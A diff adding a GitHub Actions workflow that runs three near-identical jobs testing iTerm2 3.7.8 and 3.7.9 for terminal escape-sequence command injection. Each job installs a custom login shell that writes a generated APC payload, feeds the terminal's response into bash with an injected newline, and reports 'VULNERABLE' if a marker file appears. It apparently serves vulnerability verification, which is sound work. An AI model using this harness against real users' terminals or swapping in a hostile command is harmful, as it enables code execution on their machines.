@@ -1,0 +1,785 @@
+name: macos-verify6
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - '.github/workflows/macos-verify6.yml'
+      - 'tools/**'
+  workflow_dispatch:
+
+jobs:
+  fin-378-nl:
+    runs-on: macos-latest
+    timeout-minutes: 20
+    env:
+      ITERM_VER: "3_7_8"
+      MODE: "newline"
+      MARKER: "FIN_378_NL"
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Environment
+        run: |
+          sw_vers
+          uname -m
+          echo "user=$USER home=$HOME"
+          python3 --version
+
+      - name: Install iTerm2
+        run: |
+          set -eux
+          curl -L --max-time 600 -o /tmp/i.zip "https://iterm2.com/downloads/stable/iTerm2-${ITERM_VER}.zip"
+          mkdir -p /tmp/i
+          unzip -q /tmp/i.zip -d /tmp/i
+          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
+          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" /tmp/i/iTerm.app/Contents/Info.plist
+          sudo rm -rf /Applications/iTerm.app
+          sudo cp -R /tmp/i/iTerm.app /Applications/
+          defaults write com.googlecode.iterm2 SUHasLaunchedBefore -bool true
+          defaults write com.googlecode.iterm2 NoSyncSuppressRestoreMessage -bool true
+          defaults write com.googlecode.iterm2 NoSyncDoNotAskAboutEmptySessions -bool true
+          defaults write com.googlecode.iterm2 PromptOnQuit -bool false
+
+      - name: Build payload
+        run: |
+          set -eux
+          echo "FIN_378_NL" > /tmp/marker_name
+          python3 tools/make_payload.py --mode "$MODE" --cmd "touch $MARKER" --out /tmp/payload.md
+          od -c /tmp/payload.md | head -6
+          python3 -c "import base64,re;raw=open('/tmp/payload.md','rb').read();m=re.search(rb'i=1;([A-Za-z0-9+/=]+)',raw);print('PATH:',repr(base64.b64decode(m.group(1)).decode('utf-8')) if m else '(none)')"
+
+      - name: Install final shell
+        run: |
+          set -eux
+          cat > /tmp/lsh.py <<'FINEOF'
+          #!/usr/bin/env python3
+          import os, sys, time, select, fcntl, traceback
+
+          LOG = "/tmp/lsh.log"
+
+          def log(m):
+              try:
+                  with open(LOG, "a") as f:
+                      f.write(str(m) + "\n")
+              except Exception:
+                  pass
+
+          def main():
+              log("=== final shell pid=%d uid=%d ===" % (os.getpid(), os.getuid()))
+              try:
+                  log("tty=%s" % os.ttyname(0))
+              except Exception:
+                  log("tty=NOT_A_TTY")
+                  os.execv("/bin/bash", ["/bin/bash", "-l"])
+                  return
+
+              # ① 先切 raw，避免 TCSAFLUSH 冲掉后面的响应
+              try:
+                  import tty as ttymod
+                  ttymod.setraw(0, ttymod.TCSANOW)
+                  log("raw mode set (TCSANOW)")
+              except Exception as e:
+                  log("setraw failed: %r" % (e,))
+
+              time.sleep(2)
+
+              # ② 吐 payload，让 iTerm2 解析 APC
+              try:
+                  payload = open("/tmp/payload.md", "rb").read()
+                  os.write(1, payload)
+                  log("payload written: %d bytes" % len(payload))
+              except Exception as e:
+                  log("payload failed: %r" % (e,))
+
+              time.sleep(2)
+
+              # ③ 读完整响应
+              try:
+                  fl = fcntl.fcntl(0, fcntl.F_GETFL)
+                  fcntl.fcntl(0, fcntl.F_SETFL, fl | os.O_NONBLOCK)
+              except Exception as e:
+                  log("fcntl failed: %r" % (e,))
+
+              captured = b""
+              deadline = time.time() + 6
+              while time.time() < deadline:
+                  try:
+                      r, _, _ = select.select([0], [], [], 0.25)
+                  except Exception:
+                      break
+                  if not r:
+                      continue
+                  try:
+                      d = os.read(0, 65536)
+                  except OSError:
+                      d = b""
+                  if d:
+                      captured += d
+
+              log("captured %d bytes" % len(captured))
+              try:
+                  open("/tmp/captured.bin", "wb").write(captured)
+                  open("/tmp/captured.hex", "w").write(captured.hex())
+                  open("/tmp/decoded.txt", "w").write(
+                      "HEX:\n%s\n\nREPR:\n%r\n" % (captured.hex(), captured))
+              except Exception:
+                  pass
+
+              # ④ 起内层 PTY + bash，cwd 设成 $HOME 让相对路径的 touch 落在能查到的位置
+              try:
+                  os.chdir(os.path.expanduser("~"))
+                  log("cwd=%s" % os.getcwd())
+              except Exception as e:
+                  log("chdir failed: %r" % (e,))
+
+              import pty
+              pid, fd = pty.fork()
+              if pid == 0:
+                  try:
+                      os.execv("/bin/bash", ["/bin/bash", "-l"])
+                  except Exception:
+                      os._exit(1)
+              log("inner bash forked pid=%d master=%d" % (pid, fd))
+
+              # ⑤ 把响应喂进去
+              if captured:
+                  try:
+                      os.write(fd, captured)
+                      log("fed %d bytes into inner pty" % len(captured))
+                  except Exception as e:
+                      log("feed failed: %r" % (e,))
+
+              # ⑥ 补换行 —— 等价于用户按回车
+              time.sleep(0.5)
+              try:
+                  os.write(fd, b"\n")
+                  log("newline injected")
+              except Exception as e:
+                  log("newline failed: %r" % (e,))
+
+              # ⑦ 转发一会儿，然后检查 marker
+              start = time.time()
+              while time.time() - start < 10:
+                  try:
+                      r, _, _ = select.select([0, fd], [], [], 0.25)
+                  except Exception:
+                      break
+                  for f in r:
+                      try:
+                          d = os.read(f, 65536)
+                      except OSError:
+                          d = b""
+                      if not d:
+                          continue
+                      if f == 0:
+                          try:
+                              os.write(fd, d)
+                          except Exception:
+                              pass
+                      else:
+                          try:
+                              os.write(1, d)
+                          except Exception:
+                              pass
+
+              # ⑧ marker 检查
+              try:
+                  name = open("/tmp/marker_name").read().strip()
+                  marker = os.path.join(os.path.expanduser("~"), name)
+                  if os.path.exists(marker):
+                      log("MARKER_PRESENT: " + marker)
+                  else:
+                      log("MARKER_ABSENT: " + marker)
+              except Exception as e:
+                  log("marker check failed: %r" % (e,))
+
+              log("=== final shell done ===")
+              time.sleep(15)
+
+          if __name__ == "__main__":
+              try:
+                  main()
+              except Exception:
+                  log("FATAL:\n" + traceback.format_exc())
+                  os.execv("/bin/bash", ["/bin/bash", "-l"])
+
+          FINEOF
+          PY=$(which python3)
+          sed -i '' "1s|.*|#!$PY|" /tmp/lsh.py
+          chmod 755 /tmp/lsh.py
+          if ! grep -qx /tmp/lsh.py /etc/shells 2>/dev/null; then
+            echo /tmp/lsh.py | sudo tee -a /etc/shells
+          fi
+          sudo chsh -s /tmp/lsh.py "$USER"
+          dscl . -read /Users/$USER UserShell
+
+      - name: Clean
+        run: rm -f "$HOME/$MARKER" /tmp/lsh.log /tmp/captured.bin /tmp/captured.hex /tmp/decoded.txt
+
+      - name: Launch
+        run: |
+          open -a /Applications/iTerm.app
+          sleep 32
+          pgrep -l iTerm || echo ITERM_NOT_RUNNING
+
+      - name: Wait
+        run: |
+          for i in $(seq 1 16); do
+            sleep 5
+            [ -f /tmp/decoded.txt ] && { echo "decoded after $((i*5))s"; break; }
+          done
+          sleep 6
+
+      - name: Report
+        if: always()
+        run: |
+          echo "=============== REPORT fin-378-nl ==============="
+          echo "--- lsh.log ---"
+          cat /tmp/lsh.log 2>/dev/null || echo "(no log)"
+          echo ""
+          echo "--- captured ---"
+          cat /tmp/decoded.txt 2>/dev/null || echo "NO_CAPTURE"
+          echo ""
+          echo "--- marker ---"
+          if [ -f "$HOME/$MARKER" ]; then
+            echo "[RESULT] VULNERABLE"
+            ls -la "$HOME/$MARKER"
+          else
+            echo "[RESULT] NOT_EXPLOITED"
+          fi
+          echo "--- find fallback ---"
+          sudo find / -maxdepth 3 -name "$MARKER" 2>/dev/null | head -5
+
+      - name: Screenshot
+        if: always()
+        run: screencapture -x /tmp/shot.png 2>/dev/null || true
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ev6-fin-378-nl
+          path: |
+            /tmp/payload.md
+            /tmp/lsh.log
+            /tmp/captured.bin
+            /tmp/decoded.txt
+            /tmp/shot.png
+          if-no-files-found: warn
+  fin-379-nl:
+    runs-on: macos-latest
+    timeout-minutes: 20
+    env:
+      ITERM_VER: "3_7_9"
+      MODE: "newline"
+      MARKER: "FIN_379_NL"
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Environment
+        run: |
+          sw_vers
+          uname -m
+          echo "user=$USER home=$HOME"
+          python3 --version
+
+      - name: Install iTerm2
+        run: |
+          set -eux
+          curl -L --max-time 600 -o /tmp/i.zip "https://iterm2.com/downloads/stable/iTerm2-${ITERM_VER}.zip"
+          mkdir -p /tmp/i
+          unzip -q /tmp/i.zip -d /tmp/i
+          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
+          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" /tmp/i/iTerm.app/Contents/Info.plist
+          sudo rm -rf /Applications/iTerm.app
+          sudo cp -R /tmp/i/iTerm.app /Applications/
+          defaults write com.googlecode.iterm2 SUHasLaunchedBefore -bool true
+          defaults write com.googlecode.iterm2 NoSyncSuppressRestoreMessage -bool true
+          defaults write com.googlecode.iterm2 NoSyncDoNotAskAboutEmptySessions -bool true
+          defaults write com.googlecode.iterm2 PromptOnQuit -bool false
+
+      - name: Build payload
+        run: |
+          set -eux
+          echo "FIN_379_NL" > /tmp/marker_name
+          python3 tools/make_payload.py --mode "$MODE" --cmd "touch $MARKER" --out /tmp/payload.md
+          od -c /tmp/payload.md | head -6
+          python3 -c "import base64,re;raw=open('/tmp/payload.md','rb').read();m=re.search(rb'i=1;([A-Za-z0-9+/=]+)',raw);print('PATH:',repr(base64.b64decode(m.group(1)).decode('utf-8')) if m else '(none)')"
+
+      - name: Install final shell
+        run: |
+          set -eux
+          cat > /tmp/lsh.py <<'FINEOF'
+          #!/usr/bin/env python3
+          import os, sys, time, select, fcntl, traceback
+
+          LOG = "/tmp/lsh.log"
+
+          def log(m):
+              try:
+                  with open(LOG, "a") as f:
+                      f.write(str(m) + "\n")
+              except Exception:
+                  pass
+
+          def main():
+              log("=== final shell pid=%d uid=%d ===" % (os.getpid(), os.getuid()))
+              try:
+                  log("tty=%s" % os.ttyname(0))
+              except Exception:
+                  log("tty=NOT_A_TTY")
+                  os.execv("/bin/bash", ["/bin/bash", "-l"])
+                  return
+
+              # ① 先切 raw，避免 TCSAFLUSH 冲掉后面的响应
+              try:
+                  import tty as ttymod
+                  ttymod.setraw(0, ttymod.TCSANOW)
+                  log("raw mode set (TCSANOW)")
+              except Exception as e:
+                  log("setraw failed: %r" % (e,))
+
+              time.sleep(2)
+
+              # ② 吐 payload，让 iTerm2 解析 APC
+              try:
+                  payload = open("/tmp/payload.md", "rb").read()
+                  os.write(1, payload)
+                  log("payload written: %d bytes" % len(payload))
+              except Exception as e:
+                  log("payload failed: %r" % (e,))
+
+              time.sleep(2)
+
+              # ③ 读完整响应
+              try:
+                  fl = fcntl.fcntl(0, fcntl.F_GETFL)
+                  fcntl.fcntl(0, fcntl.F_SETFL, fl | os.O_NONBLOCK)
+              except Exception as e:
+                  log("fcntl failed: %r" % (e,))
+
+              captured = b""
+              deadline = time.time() + 6
+              while time.time() < deadline:
+                  try:
+                      r, _, _ = select.select([0], [], [], 0.25)
+                  except Exception:
+                      break
+                  if not r:
+                      continue
+                  try:
+                      d = os.read(0, 65536)
+                  except OSError:
+                      d = b""
+                  if d:
+                      captured += d
+
+              log("captured %d bytes" % len(captured))
+              try:
+                  open("/tmp/captured.bin", "wb").write(captured)
+                  open("/tmp/captured.hex", "w").write(captured.hex())
+                  open("/tmp/decoded.txt", "w").write(
+                      "HEX:\n%s\n\nREPR:\n%r\n" % (captured.hex(), captured))
+              except Exception:
+                  pass
+
+              # ④ 起内层 PTY + bash，cwd 设成 $HOME 让相对路径的 touch 落在能查到的位置
+              try:
+                  os.chdir(os.path.expanduser("~"))
+                  log("cwd=%s" % os.getcwd())
+              except Exception as e:
+                  log("chdir failed: %r" % (e,))
+
+              import pty
+              pid, fd = pty.fork()
+              if pid == 0:
+                  try:
+                      os.execv("/bin/bash", ["/bin/bash", "-l"])
+                  except Exception:
+                      os._exit(1)
+              log("inner bash forked pid=%d master=%d" % (pid, fd))
+
+              # ⑤ 把响应喂进去
+              if captured:
+                  try:
+                      os.write(fd, captured)
+                      log("fed %d bytes into inner pty" % len(captured))
+                  except Exception as e:
+                      log("feed failed: %r" % (e,))
+
+              # ⑥ 补换行 —— 等价于用户按回车
+              time.sleep(0.5)
+              try:
+                  os.write(fd, b"\n")
+                  log("newline injected")
+              except Exception as e:
+                  log("newline failed: %r" % (e,))
+
+              # ⑦ 转发一会儿，然后检查 marker
+              start = time.time()
+              while time.time() - start < 10:
+                  try:
+                      r, _, _ = select.select([0, fd], [], [], 0.25)
+                  except Exception:
+                      break
+                  for f in r:
+                      try:
+                          d = os.read(f, 65536)
+                      except OSError:
+                          d = b""
+                      if not d:
+                          continue
+                      if f == 0:
+                          try:
+                              os.write(fd, d)
+                          except Exception:
+                              pass
+                      else:
+                          try:
+                              os.write(1, d)
+                          except Exception:
+                              pass
+
+              # ⑧ marker 检查
+              try:
+                  name = open("/tmp/marker_name").read().strip()
+                  marker = os.path.join(os.path.expanduser("~"), name)
+                  if os.path.exists(marker):
+                      log("MARKER_PRESENT: " + marker)
+                  else:
+                      log("MARKER_ABSENT: " + marker)
+              except Exception as e:
+                  log("marker check failed: %r" % (e,))
+
+              log("=== final shell done ===")
+              time.sleep(15)
+
+          if __name__ == "__main__":
+              try:
+                  main()
+              except Exception:
+                  log("FATAL:\n" + traceback.format_exc())
+                  os.execv("/bin/bash", ["/bin/bash", "-l"])
+
+          FINEOF
+          PY=$(which python3)
+          sed -i '' "1s|.*|#!$PY|" /tmp/lsh.py
+          chmod 755 /tmp/lsh.py
+          if ! grep -qx /tmp/lsh.py /etc/shells 2>/dev/null; then
+            echo /tmp/lsh.py | sudo tee -a /etc/shells
+          fi
+          sudo chsh -s /tmp/lsh.py "$USER"
+          dscl . -read /Users/$USER UserShell
+
+      - name: Clean
+        run: rm -f "$HOME/$MARKER" /tmp/lsh.log /tmp/captured.bin /tmp/captured.hex /tmp/decoded.txt
+
+      - name: Launch
+        run: |
+          open -a /Applications/iTerm.app
+          sleep 32
+          pgrep -l iTerm || echo ITERM_NOT_RUNNING
+
+      - name: Wait
+        run: |
+          for i in $(seq 1 16); do
+            sleep 5
+            [ -f /tmp/decoded.txt ] && { echo "decoded after $((i*5))s"; break; }
+          done
+          sleep 6
+
+      - name: Report
+        if: always()
+        run: |
+          echo "=============== REPORT fin-379-nl ==============="
+          echo "--- lsh.log ---"
+          cat /tmp/lsh.log 2>/dev/null || echo "(no log)"
+          echo ""
+          echo "--- captured ---"
+          cat /tmp/decoded.txt 2>/dev/null || echo "NO_CAPTURE"
+          echo ""
+          echo "--- marker ---"
+          if [ -f "$HOME/$MARKER" ]; then
+            echo "[RESULT] VULNERABLE"
+            ls -la "$HOME/$MARKER"
+          else
+            echo "[RESULT] NOT_EXPLOITED"
+          fi
+          echo "--- find fallback ---"
+          sudo find / -maxdepth 3 -name "$MARKER" 2>/dev/null | head -5
+
+      - name: Screenshot
+        if: always()
+        run: screencapture -x /tmp/shot.png 2>/dev/null || true
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ev6-fin-379-nl
+          path: |
+            /tmp/payload.md
+            /tmp/lsh.log
+            /tmp/captured.bin
+            /tmp/decoded.txt
+            /tmp/shot.png
+          if-no-files-found: warn
+  fin-379-semi:
+    runs-on: macos-latest
+    timeout-minutes: 20
+    env:
+      ITERM_VER: "3_7_9"
+      MODE: "semicolon"
+      MARKER: "FIN_379_S"
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Environment
+        run: |
+          sw_vers
+          uname -m
+          echo "user=$USER home=$HOME"
+          python3 --version
+
+      - name: Install iTerm2
+        run: |
+          set -eux
+          curl -L --max-time 600 -o /tmp/i.zip "https://iterm2.com/downloads/stable/iTerm2-${ITERM_VER}.zip"
+          mkdir -p /tmp/i
+          unzip -q /tmp/i.zip -d /tmp/i
+          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
+          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" /tmp/i/iTerm.app/Contents/Info.plist
+          sudo rm -rf /Applications/iTerm.app
+          sudo cp -R /tmp/i/iTerm.app /Applications/
+          defaults write com.googlecode.iterm2 SUHasLaunchedBefore -bool true
+          defaults write com.googlecode.iterm2 NoSyncSuppressRestoreMessage -bool true
+          defaults write com.googlecode.iterm2 NoSyncDoNotAskAboutEmptySessions -bool true
+          defaults write com.googlecode.iterm2 PromptOnQuit -bool false
+
+      - name: Build payload
+        run: |
+          set -eux
+          echo "FIN_379_S" > /tmp/marker_name
+          python3 tools/make_payload.py --mode "$MODE" --cmd "touch $MARKER" --out /tmp/payload.md
+          od -c /tmp/payload.md | head -6
+          python3 -c "import base64,re;raw=open('/tmp/payload.md','rb').read();m=re.search(rb'i=1;([A-Za-z0-9+/=]+)',raw);print('PATH:',repr(base64.b64decode(m.group(1)).decode('utf-8')) if m else '(none)')"
+
+      - name: Install final shell
+        run: |
+          set -eux
+          cat > /tmp/lsh.py <<'FINEOF'
+          #!/usr/bin/env python3
+          import os, sys, time, select, fcntl, traceback
+
+          LOG = "/tmp/lsh.log"
+
+          def log(m):
+              try:
+                  with open(LOG, "a") as f:
+                      f.write(str(m) + "\n")
+              except Exception:
+                  pass
+
+          def main():
+              log("=== final shell pid=%d uid=%d ===" % (os.getpid(), os.getuid()))
+              try:
+                  log("tty=%s" % os.ttyname(0))
+              except Exception:
+                  log("tty=NOT_A_TTY")
+                  os.execv("/bin/bash", ["/bin/bash", "-l"])
+                  return
+
+              # ① 先切 raw，避免 TCSAFLUSH 冲掉后面的响应
+              try:
+                  import tty as ttymod
+                  ttymod.setraw(0, ttymod.TCSANOW)
+                  log("raw mode set (TCSANOW)")
+              except Exception as e:
+                  log("setraw failed: %r" % (e,))
+
+              time.sleep(2)
+
+              # ② 吐 payload，让 iTerm2 解析 APC
+              try:
+                  payload = open("/tmp/payload.md", "rb").read()
+                  os.write(1, payload)
+                  log("payload written: %d bytes" % len(payload))
+              except Exception as e:
+                  log("payload failed: %r" % (e,))
+
+              time.sleep(2)
+
+              # ③ 读完整响应
+              try:
+                  fl = fcntl.fcntl(0, fcntl.F_GETFL)
+                  fcntl.fcntl(0, fcntl.F_SETFL, fl | os.O_NONBLOCK)
+              except Exception as e:
+                  log("fcntl failed: %r" % (e,))
+
+              captured = b""
+              deadline = time.time() + 6
+              while time.time() < deadline:
+                  try:
+                      r, _, _ = select.select([0], [], [], 0.25)
+                  except Exception:
+                      break
+                  if not r:
+                      continue
+                  try:
+                      d = os.read(0, 65536)
+                  except OSError:
+                      d = b""
+                  if d:
+                      captured += d
+
+              log("captured %d bytes" % len(captured))
+              try:
+                  open("/tmp/captured.bin", "wb").write(captured)
+                  open("/tmp/captured.hex", "w").write(captured.hex())
+                  open("/tmp/decoded.txt", "w").write(
+                      "HEX:\n%s\n\nREPR:\n%r\n" % (captured.hex(), captured))
+              except Exception:
+                  pass
+
+              # ④ 起内层 PTY + bash，cwd 设成 $HOME 让相对路径的 touch 落在能查到的位置
+              try:
+                  os.chdir(os.path.expanduser("~"))
+                  log("cwd=%s" % os.getcwd())
+              except Exception as e:
+                  log("chdir failed: %r" % (e,))
+
+              import pty
+              pid, fd = pty.fork()
+              if pid == 0:
+                  try:
+                      os.execv("/bin/bash", ["/bin/bash", "-l"])
+                  except Exception:
+                      os._exit(1)
+              log("inner bash forked pid=%d master=%d" % (pid, fd))
+
+              # ⑤ 把响应喂进去
+              if captured:
+                  try:
+                      os.write(fd, captured)
+                      log("fed %d bytes into inner pty" % len(captured))
+                  except Exception as e:
+                      log("feed failed: %r" % (e,))
+
+              # ⑥ 补换行 —— 等价于用户按回车
+              time.sleep(0.5)
+              try:
+                  os.write(fd, b"\n")
+                  log("newline injected")
+              except Exception as e:
+                  log("newline failed: %r" % (e,))
+
+              # ⑦ 转发一会儿，然后检查 marker
+              start = time.time()
+              while time.time() - start < 10:
+                  try:
+                      r, _, _ = select.select([0, fd], [], [], 0.25)
+                  except Exception:
+                      break
+                  for f in r:
+                      try:
+                          d = os.read(f, 65536)
+                      except OSError:
+                          d = b""
+                      if not d:
+                          continue
+                      if f == 0:
+                          try:
+                              os.write(fd, d)
+                          except Exception:
+                              pass
+                      else:
+                          try:
+                              os.write(1, d)
+                          except Exception:
+                              pass
+
+              # ⑧ marker 检查
+              try:
+                  name = open("/tmp/marker_name").read().strip()
+                  marker = os.path.join(os.path.expanduser("~"), name)
+                  if os.path.exists(marker):
+                      log("MARKER_PRESENT: " + marker)
+                  else:
+                      log("MARKER_ABSENT: " + marker)
+              except Exception as e:
+                  log("marker check failed: %r" % (e,))
+
+              log("=== final shell done ===")
+              time.sleep(15)
+
+          if __name__ == "__main__":
+              try:
+                  main()
+              except Exception:
+                  log("FATAL:\n" + traceback.format_exc())
+                  os.execv("/bin/bash", ["/bin/bash", "-l"])
+
+          FINEOF
+          PY=$(which python3)
+          sed -i '' "1s|.*|#!$PY|" /tmp/lsh.py
+          chmod 755 /tmp/lsh.py
+          if ! grep -qx /tmp/lsh.py /etc/shells 2>/dev/null; then
+            echo /tmp/lsh.py | sudo tee -a /etc/shells
+          fi
+          sudo chsh -s /tmp/lsh.py "$USER"
+          dscl . -read /Users/$USER UserShell
+
+      - name: Clean
+        run: rm -f "$HOME/$MARKER" /tmp/lsh.log /tmp/captured.bin /tmp/captured.hex /tmp/decoded.txt
+
+      - name: Launch
+        run: |
+          open -a /Applications/iTerm.app
+          sleep 32
+          pgrep -l iTerm || echo ITERM_NOT_RUNNING
+
+      - name: Wait
+        run: |
+          for i in $(seq 1 16); do
+            sleep 5
+            [ -f /tmp/decoded.txt ] && { echo "decoded after $((i*5))s"; break; }
+          done
+          sleep 6
+
+      - name: Report
+        if: always()
+        run: |
+          echo "=============== REPORT fin-379-semi ==============="
+          echo "--- lsh.log ---"
+          cat /tmp/lsh.log 2>/dev/null || echo "(no log)"
+          echo ""
+          echo "--- captured ---"
+          cat /tmp/decoded.txt 2>/dev/null || echo "NO_CAPTURE"
+          echo ""
+          echo "--- marker ---"
+          if [ -f "$HOME/$MARKER" ]; then
+            echo "[RESULT] VULNERABLE"
+            ls -la "$HOME/$MARKER"
+          else
+            echo "[RESULT] NOT_EXPLOITED"
+          fi
+          echo "--- find fallback ---"
+          sudo find / -maxdepth 3 -name "$MARKER" 2>/dev/null | head -5
+
+      - name: Screenshot
+        if: always()
+        run: screencapture -x /tmp/shot.png 2>/dev/null || true
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ev6-fin-379-semi
+          path: |
+            /tmp/payload.md
+            /tmp/lsh.log
+            /tmp/captured.bin
+            /tmp/decoded.txt
+            /tmp/shot.png
+          if-no-files-found: warn
